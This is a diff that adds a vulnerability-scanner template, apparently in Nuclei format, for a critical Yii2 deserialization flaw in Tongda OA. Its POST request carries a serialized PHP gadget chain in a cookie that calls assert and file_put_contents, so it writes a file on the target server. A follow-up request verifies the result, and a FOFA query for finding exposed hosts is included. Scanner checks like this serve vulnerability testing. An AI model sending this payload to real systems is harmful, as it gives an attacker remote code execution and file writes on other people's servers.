@@ -1,0 +1,32 @@
+id: tongda-oa-YII2-loadCookies-deserialization
+info:
+  name: 通达 OA YII2 loadCookies - deserialization
+  author: leadlife
+  severity: critical
+  description: 通达OA是由北京通达信科科技有限公司研发的一款通用型OA产品，涵盖了个人事务、行政办公、流程审批、知识管理、人力资源管理、组织机构管理等企业信息化管理功能。该应用使用的yii框架存在反序列化漏洞，攻击者可以利用该漏洞上传恶意文件，获取服务器权限。
+  reference: 
+    - https://www.freebuf.com/vuls/378878.html
+    - https://xz.aliyun.com/t/12855
+  metadata:
+    verified: true
+    fofa-query: app="TDXK-通达OA" || icon_hash="-759108386"
+  tags: tongda,oa,rce
+
+http:
+  - raw:
+      - |
+        POST /general/appbuilder/web/portal/gateway/?id=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: _GET=0ef8ec3873f644e20bd4e4b2124c4b9db5076ab0cb8f6c9370b635bde1516ad5O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A4%3A%7Bs%3A2%3A%22db%22%3BN%3Bs%3A5%3A%22query%22%3BN%3Bs%3A4%3A%22each%22%3BN%3Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A1%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A8%3A%7Bs%3A8%3A%22hostname%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bi%3A135%3Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A8%3A%22password%22%3BN%3Bs%3A8%3A%22database%22%3BN%3Bs%3A7%3A%22_socket%22%3Bb%3A0%3Bs%3A30%3A%22%00yii%5Cbase%5CComponent%00_behaviors%22%3Bi%3A1%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Bs%3A6%3A%22assert%22%3Bs%3A2%3A%22id%22%3Bs%3A262%3A%22file_put_contents%28td_authcode%28%272d22pqfObQa7%2B4Pt3UvrUMbGWTNyTXy3nrI2H496dQRdy3WPedO2Kma7%27%2C%27DECODE%27%2C%2B%271234567890%27%2C%2B%27%27%29%2Ctd_authcode%28%27c8223YHEHcTe5dHJkrA87aPLiUehCdYIcXEyUYav%2FV3egAyIWdIpF1zLPfwTwc3PtEGRHl4ybv%2B9oPyBN%2B22fXmfwBtkhTmA82D%2F2Q%27%2C%27DECODE%27%2C%2B%271234567890%27%2C%2B%27%27%29%29%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7D%7D%7D%7D
+      
+      - |+
+        GET /general/appbuilder/web/get_image.php?id=83867 HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 500 && status_code_2 == 200
+          - contains(body_2,'69ecce9b96558f276bf03d58d92a77e6')
+        condition: and
